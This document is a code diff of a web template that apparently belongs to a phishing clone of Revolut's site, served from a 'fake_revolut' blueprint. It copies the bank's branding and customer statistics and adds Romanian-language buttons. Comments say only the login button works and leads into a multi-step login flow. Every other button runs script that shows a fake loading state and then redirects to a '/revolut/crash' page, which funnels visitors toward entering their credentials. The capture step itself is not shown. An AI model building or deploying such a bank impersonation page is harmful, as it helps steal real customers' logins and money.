@@ -2,15 +2,163 @@
 
 {% block title %}Revolut - One app, all things money{% endblock %}
 
+{% block extra_head %}
+<style>
+/* Advanced animations and effects */
+@keyframes float {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-10px); }
+    100% { transform: translateY(0px); }
+}
+
+@keyframes pulse {
+    0% { opacity: 1; }
+    50% { opacity: 0.7; }
+    100% { opacity: 1; }
+}
+
+@keyframes slideInUp {
+    from { transform: translateY(50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+@keyframes bounce {
+    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+    40% { transform: translateY(-10px); }
+    60% { transform: translateY(-5px); }
+}
+
+.hero-content {
+    animation: slideInUp 1s ease-out;
+}
+
+.floating-icon {
+    animation: float 3s ease-in-out infinite;
+    display: inline-block;
+}
+
+.pulsing {
+    animation: pulse 2s infinite;
+}
+
+.btn-animated {
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    position: relative;
+    overflow: hidden;
+}
+
+.btn-animated::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: left 0.5s;
+}
+
+.btn-animated:hover::before {
+    left: 100%;
+}
+
+.btn-animated:hover {
+    transform: translateY(-3px) scale(1.02);
+    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+}
+
+.interactive-card {
+    transition: all 0.3s ease;
+    cursor: pointer;
+}
+
+.interactive-card:hover {
+    transform: translateY(-8px) scale(1.03);
+    box-shadow: 0 20px 40px rgba(99, 102, 241, 0.3);
+}
+
+.glowing-border {
+    position: relative;
+    overflow: hidden;
+}
+
+.glowing-border::before {
+    content: '';
+    position: absolute;
+    top: -2px;
+    left: -2px;
+    right: -2px;
+    bottom: -2px;
+    background: linear-gradient(45deg, #6366f1, #8b5cf6, #ec4899, #f59e0b);
+    border-radius: inherit;
+    z-index: -1;
+    opacity: 0;
+    transition: opacity 0.3s;
+}
+
+.glowing-border:hover::before {
+    opacity: 1;
+    animation: pulse 1.5s infinite;
+}
+
+.stats-counter {
+    font-size: 3rem;
+    font-weight: 700;
+    color: #0066cc;
+    position: relative;
+}
+
+.feature-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 2rem;
+    margin-top: 3rem;
+}
+
+.parallax-bg {
+    background-attachment: fixed;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+}
+</style>
+{% endblock %}
+
 {% block content %}
-<section class="hero-section">
+<section class="hero-section parallax-bg">
     <div class="main-container">
         <div class="hero-content">
-            <h1>One app, all things money</h1>
+            <h1 class="pulsing">
+                <span class="floating-icon">💳</span> 
+                One app, all things money
+                <span class="floating-icon">🌟</span>
+            </h1>
             <p>From everyday spending to international transfers and investments, Revolut helps you get more from your money</p>
             <div style="margin-top: 2rem;">
-                <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary btn-large">Get Revolut</a>
-                <a href="{{ url_for('fake_revolut.login_page') }}" class="btn btn-secondary btn-large" style="margin-left: 1rem;">Sign in</a>
+                <!-- Only this button is functional and leads to login flow -->
+                <a href="{{ url_for('fake_revolut.login_step1') }}" class="btn btn-primary btn-large btn-animated" id="main-login-btn">
+                    <span class="floating-icon">🔐</span> Intră în cont
+                </a>
+                
+                <!-- All these buttons will trigger crash -->
+                <a href="#" class="btn btn-secondary btn-large btn-animated crash-trigger" style="margin-left: 1rem;">
+                    <span class="floating-icon">📱</span> Descarcă aplicația
+                </a>
+            </div>
+            
+            <div style="margin-top: 1.5rem; display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">📊</span> Investește acum
+                </a>
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">🏢</span> Revolut Business
+                </a>
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">💰</span> Carduri premium
+                </a>
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">🌍</span> Transferuri globale
+                </a>
             </div>
         </div>
     </div>
@@ -19,37 +167,65 @@
 <section style="padding: 4rem 0; background: white;">
     <div class="main-container">
         <div style="text-align: center; margin-bottom: 3rem;">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: #1a1a1a;">Banking, but better</h2>
+            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: #1a1a1a;">
+                <span class="floating-icon">⚡</span> Banking, but better <span class="floating-icon">🚀</span>
+            </h2>
             <p style="font-size: 1.2rem; color: #666; max-width: 600px; margin: 0 auto;">Join 35+ million customers who trust Revolut for all their financial needs</p>
         </div>
         
-        <div class="dashboard-grid">
-            <div class="dashboard-card">
-                <div class="icon" style="font-size: 3rem; margin-bottom: 1rem;">💳</div>
+        <div class="feature-grid">
+            <div class="dashboard-card interactive-card glowing-border">
+                <div class="icon floating-icon" style="font-size: 3rem; margin-bottom: 1rem;">💳</div>
                 <h3>Spend & Save</h3>
                 <p style="color: #666; line-height: 1.6;">Get a debit card that gives you the real exchange rate and fee-free spending worldwide</p>
-                <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary" style="margin-top: 1rem;">Learn more</a>
+                <a href="#" class="btn btn-primary crash-trigger btn-animated" style="margin-top: 1rem;">
+                    <span class="floating-icon">📖</span> Află mai multe
+                </a>
             </div>
             
-            <div class="dashboard-card">
-                <div class="icon" style="font-size: 3rem; margin-bottom: 1rem;">🌍</div>
+            <div class="dashboard-card interactive-card glowing-border">
+                <div class="icon floating-icon" style="font-size: 3rem; margin-bottom: 1rem;">🌍</div>
                 <h3>Global Transfers</h3>
                 <p style="color: #666; line-height: 1.6;">Send money abroad instantly at the real exchange rate with no hidden fees</p>
-                <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary" style="margin-top: 1rem;">Learn more</a>
+                <a href="#" class="btn btn-primary crash-trigger btn-animated" style="margin-top: 1rem;">
+                    <span class="floating-icon">🚀</span> Trimite bani
+                </a>
             </div>
             
-            <div class="dashboard-card">
-                <div class="icon" style="font-size: 3rem; margin-bottom: 1rem;">📈</div>
+            <div class="dashboard-card interactive-card glowing-border">
+                <div class="icon floating-icon" style="font-size: 3rem; margin-bottom: 1rem;">📈</div>
                 <h3>Invest</h3>
                 <p style="color: #666; line-height: 1.6;">Commission-free trading in stocks, crypto, and commodities</p>
-                <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary" style="margin-top: 1rem;">Learn more</a>
+                <a href="#" class="btn btn-primary crash-trigger btn-animated" style="margin-top: 1rem;">
+                    <span class="floating-icon">📊</span> Începe să investești
+                </a>
             </div>
             
-            <div class="dashboard-card">
-                <div class="icon" style="font-size: 3rem; margin-bottom: 1rem;">🏢</div>
+            <div class="dashboard-card interactive-card glowing-border">
+                <div class="icon floating-icon" style="font-size: 3rem; margin-bottom: 1rem;">🏢</div>
                 <h3>Business</h3>
                 <p style="color: #666; line-height: 1.6;">Multi-currency business accounts with expense management and corporate cards</p>
-                <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary" style="margin-top: 1rem;">Learn more</a>
+                <a href="#" class="btn btn-primary crash-trigger btn-animated" style="margin-top: 1rem;">
+                    <span class="floating-icon">🏬</span> Cont business
+                </a>
+            </div>
+            
+            <div class="dashboard-card interactive-card glowing-border">
+                <div class="icon floating-icon" style="font-size: 3rem; margin-bottom: 1rem;">🎯</div>
+                <h3>Junior Account</h3>
+                <p style="color: #666; line-height: 1.6;">Teaching financial responsibility with parental controls and spending insights</p>
+                <a href="#" class="btn btn-primary crash-trigger btn-animated" style="margin-top: 1rem;">
+                    <span class="floating-icon">👦</span> Pentru copii
+                </a>
+            </div>
+            
+            <div class="dashboard-card interactive-card glowing-border">
+                <div class="icon floating-icon" style="font-size: 3rem; margin-bottom: 1rem;">💰</div>
+                <h3>Premium Cards</h3>
+                <p style="color: #666; line-height: 1.6;">Metal cards with exclusive benefits, travel insurance, and airport lounge access</p>
+                <a href="#" class="btn btn-primary crash-trigger btn-animated" style="margin-top: 1rem;">
+                    <span class="floating-icon">💎</span> Upgrade premium
+                </a>
             </div>
         </div>
     </div>
@@ -58,26 +234,52 @@
 <section style="padding: 4rem 0; background: #f5f5f5;">
     <div class="main-container">
         <div style="text-align: center; margin-bottom: 3rem;">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: #1a1a1a;">Join millions worldwide</h2>
+            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: #1a1a1a;">
+                <span class="floating-icon">🌟</span> Join millions worldwide <span class="floating-icon">🌍</span>
+            </h2>
             <p style="font-size: 1.2rem; color: #666;">Experience banking without borders</p>
         </div>
         
-        <div style="background: white; border-radius: 16px; padding: 3rem; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1);">
+        <div style="background: white; border-radius: 16px; padding: 3rem; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1);" class="glowing-border">
             <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 2rem; margin-bottom: 2rem;">
-                <div>
-                    <div style="font-size: 3rem; font-weight: 700; color: #0066cc;">35M+</div>
+                <div class="interactive-card">
+                    <div class="stats-counter floating-icon" data-target="35">0M+</div>
                     <div style="color: #666; font-weight: 500;">Customers worldwide</div>
                 </div>
-                <div>
-                    <div style="font-size: 3rem; font-weight: 700; color: #0066cc;">180+</div>
+                <div class="interactive-card">
+                    <div class="stats-counter floating-icon" data-target="180">0+</div>
                     <div style="color: #666; font-weight: 500;">Countries supported</div>
                 </div>
-                <div>
-                    <div style="font-size: 3rem; font-weight: 700; color: #0066cc;">$1B+</div>
+                <div class="interactive-card">
+                    <div class="stats-counter floating-icon" data-target="1">$0B+</div>
                     <div style="color: #666; font-weight: 500;">Transferred daily</div>
                 </div>
+                <div class="interactive-card">
+                    <div class="stats-counter floating-icon" data-target="150">0+</div>
+                    <div style="color: #666; font-weight: 500;">Currencies supported</div>
+                </div>
             </div>
-            <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary btn-large">Start your journey</a>
+            
+            <div style="margin-bottom: 2rem;">
+                <a href="#" class="btn btn-primary btn-large btn-animated crash-trigger">
+                    <span class="floating-icon">✨</span> Start your journey
+                </a>
+                <a href="#" class="btn btn-secondary btn-large btn-animated crash-trigger" style="margin-left: 1rem;">
+                    <span class="floating-icon">📱</span> Download app
+                </a>
+            </div>
+            
+            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-top: 1rem;">
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">💳</span> Apply for card
+                </a>
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">🏦</span> Open business account
+                </a>
+                <a href="#" class="btn btn-secondary crash-trigger btn-animated">
+                    <span class="floating-icon">📈</span> Start trading
+                </a>
+            </div>
         </div>
     </div>
 </section>
@@ -85,13 +287,104 @@
 <section style="padding: 4rem 0; background: white;">
     <div class="main-container">
         <div style="text-align: center;">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: #1a1a1a;">Ready to get started?</h2>
+            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: #1a1a1a;">
+                <span class="floating-icon">🚀</span> Ready to get started? <span class="floating-icon">💫</span>
+            </h2>
             <p style="font-size: 1.2rem; color: #666; margin-bottom: 2rem;">It takes less than 5 minutes to sign up</p>
-            <div>
-                <a href="{{ url_for('fake_revolut.register_page') }}" class="btn btn-primary btn-large">Open account</a>
-                <a href="{{ url_for('fake_revolut.login_page') }}" class="btn btn-secondary btn-large" style="margin-left: 1rem;">Already have an account?</a>
+            
+            <div style="margin-bottom: 2rem;">
+                <a href="#" class="btn btn-primary btn-large btn-animated crash-trigger">
+                    <span class="floating-icon">🎯</span> Open account
+                </a>
+                <a href="#" class="btn btn-secondary btn-large btn-animated crash-trigger" style="margin-left: 1rem;">
+                    <span class="floating-icon">🔍</span> Learn more
+                </a>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; margin-top: 3rem;">
+                <div class="interactive-card glowing-border" style="padding: 2rem; background: #f8fafc; border-radius: 12px;">
+                    <div class="floating-icon" style="font-size: 2.5rem; margin-bottom: 1rem;">📱</div>
+                    <h4>Mobile Banking</h4>
+                    <p style="color: #666; margin-bottom: 1rem;">Manage your money on the go</p>
+                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
+                        <span class="floating-icon">⬇️</span> Download
+                    </a>
+                </div>
+                
+                <div class="interactive-card glowing-border" style="padding: 2rem; background: #f8fafc; border-radius: 12px;">
+                    <div class="floating-icon" style="font-size: 2.5rem; margin-bottom: 1rem;">💼</div>
+                    <h4>Business Solutions</h4>
+                    <p style="color: #666; margin-bottom: 1rem;">Banking for your business</p>
+                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
+                        <span class="floating-icon">🏢</span> Get started
+                    </a>
+                </div>
+                
+                <div class="interactive-card glowing-border" style="padding: 2rem; background: #f8fafc; border-radius: 12px;">
+                    <div class="floating-icon" style="font-size: 2.5rem; margin-bottom: 1rem;">🎓</div>
+                    <h4>Financial Education</h4>
+                    <p style="color: #666; margin-bottom: 1rem;">Learn about investing</p>
+                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
+                        <span class="floating-icon">📚</span> Learn
+                    </a>
+                </div>
+                
+                <div class="interactive-card glowing-border" style="padding: 2rem; background: #f8fafc; border-radius: 12px;">
+                    <div class="floating-icon" style="font-size: 2.5rem; margin-bottom: 1rem;">💎</div>
+                    <h4>Premium Perks</h4>
+                    <p style="color: #666; margin-bottom: 1rem;">Exclusive benefits await</p>
+                    <a href="#" class="btn btn-primary crash-trigger btn-animated">
+                        <span class="floating-icon">⭐</span> Upgrade
+                    </a>
+                </div>
             </div>
         </div>
     </div>
 </section>
+
+<script>
+// Add crash trigger functionality
+document.addEventListener('DOMContentLoaded', function() {
+    // Add click handlers for crash triggers
+    const crashTriggers = document.querySelectorAll('.crash-trigger');
+    crashTriggers.forEach(trigger => {
+        trigger.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Add loading effect
+            this.style.pointerEvents = 'none';
+            this.innerHTML = '<span class="floating-icon">⏳</span> Loading...';
+            
+            // Simulate processing time before crash
+            setTimeout(() => {
+                window.location.href = '/revolut/crash';
+            }, 1000 + Math.random() * 1000);
+        });
+    });
+    
+    // Animate stats counters
+    const statsCounters = document.querySelectorAll('.stats-counter');
+    statsCounters.forEach(counter => {
+        const target = parseInt(counter.getAttribute('data-target'));
+        let current = 0;
+        const increment = target / 50;
+        
+        const timer = setInterval(() => {
+            current += increment;
+            if (current >= target) {
+                current = target;
+                clearInterval(timer);
+            }
+            
+            if (counter.textContent.includes('$')) {
+                counter.textContent = `$${Math.floor(current)}B+`;
+            } else if (counter.textContent.includes('M')) {
+                counter.textContent = `${Math.floor(current)}M+`;
+            } else {
+                counter.textContent = `${Math.floor(current)}+`;
+            }
+        }, 50);
+    });
+});
+</script>
 {% endblock %}
